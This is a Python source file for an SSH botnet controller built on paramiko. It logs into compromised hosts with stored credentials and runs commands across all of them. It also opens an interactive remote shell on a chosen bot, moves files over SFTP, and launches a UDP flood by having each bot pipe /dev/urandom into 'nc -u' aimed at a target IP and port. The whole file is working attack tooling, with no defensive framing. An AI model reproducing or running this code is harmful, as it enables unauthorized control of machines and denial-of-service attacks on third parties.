import paramiko
from time import sleep
import sys
import random

class SSHBotnet: 
    def __init__(self, hostname, username, password, request):
        self.host=hostname
        self.user=username
        self.password=password
        self.Client = paramiko.SSHClient()
        self.Client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.run = True
        
        self._start(request)
    
    def _start(self, request):
        # check connection
        if request == 1:
            if self._check() == True:
                print('\tAlive:', self.host, self.user, self.password) 
                self._exit()
            else:
                self._exit()    
        
        # add a new bot
        elif request == 2:
            if self._check()== True:
                print('\t\tAdd new bot success\n')
                self._exit()
            else:
                print('\t\tAdd new bot fail\n')
                self._exit()
                
        # Download/upload 
        elif request == 3.1:
            print("Download or Upload:       D for download/U for upload")
            selection = input().strip()
            if selection == 'd' or selection == 'D':
                print("Enter source for download and where to store:")
                info = input().split()
                src = info[0]
                dst = info[1]
                self.download(str(src), str(dst))
                self._exit()
            else:
                print("Enter source for upload and where to store:")
                info = input().split()
                src = info[0]
                dst = info[1]
                self.upload(str(src), str(dst))
                self._exit()
                
        # sent command to 1 specific bot
        elif request == 3.2:
            self._connect()
            
        # simple Dot 
        elif 'ddos' in request:
            info = str(request).replace("ddos ", "").split()
            try:
                ip, port, loop, times_pL = info
                info = ip, int(port), int(loop),  int(times_pL)
                for n in range (int(info[2])):    
                    self._dos(info)
                print('\t'+ self.host + ' Done!')
            except Exception as e:
                print(e)
            self._exit()
         
        # sent command to all bots
        else:
            self.execute_command(request)  
                 
    def _exit(self):
        self.run = False
        self.Client.close()
        sys.exit(0) 
    
    def _connect(self):
        self.Client.connect(self.host, 22 , self.user, self.password)
        while self.run == True:
            try:
                command = input("-->>").strip()
                
                if command == 'exit':
                    print("Exit!......")
                    sleep(1)
                    self._exit()
                else:
                    stdin, stdout, stderr = self.Client.exec_command(command)
                    print(stdout.read().decode())
                    print(stderr.read().decode())
            except Exception as e:
                print('ERROR' + e)
                  
    def _check(self):
        try:
            self.Client.connect(self.host, 22 , self.user, self.password)
            return True 
        except:
            return False

    def _dos(self, *args):
        self.Client.connect(self.host,22, self.user, self.password)
        host, port = args[0][0], args[0][1]

        for n in range (args[0][3]):
           
            bytes=random.randint(1, 1024)
            command = 'head -c ' + str(bytes) + ' /dev/urandom | ' + 'nc -u -w1 ' + host + ' ' + str(port)
        # ex: ddos 192.168.0.11 80 5 25
            self.Client.exec_command(command)
            
    def upload(self, src, dst):
        try:
            self.Client.connect(self.host,22, self.user, self.password)
            sftp = self.Client.open_sftp()
            sftp.put(src, dst)
            print("Upload success")
            sftp.close()
            self._exit()
        except Exception as e:
            print("Error:" + e)
            self._exit()    
        
    def download(self, src, dst):
        try:
            self.Client.connect(self.host,22, self.user, self.password) 
            sftp = self.Client.open_sftp()
            sftp.get(src, dst)
            print("Download success")
            sftp.close()
            self._exit()
        except Exception as e:
            print("Error:" + e)
            self._exit()   
    
    def execute_command(self, command):
        try:
            self.Client.connect(self.host,22, self.user, self.password)
            print('+-------------------' + self.host + '-------------------+')
            stdin, stdout, stderr = self.Client.exec_command(command)
            print(stdout.read().decode())
            print(stderr.read().decode())
        except Exception:
            print("ERROR")
        self._exit()

if __name__ == '__main__':
    SSHBotnet()                                    
        
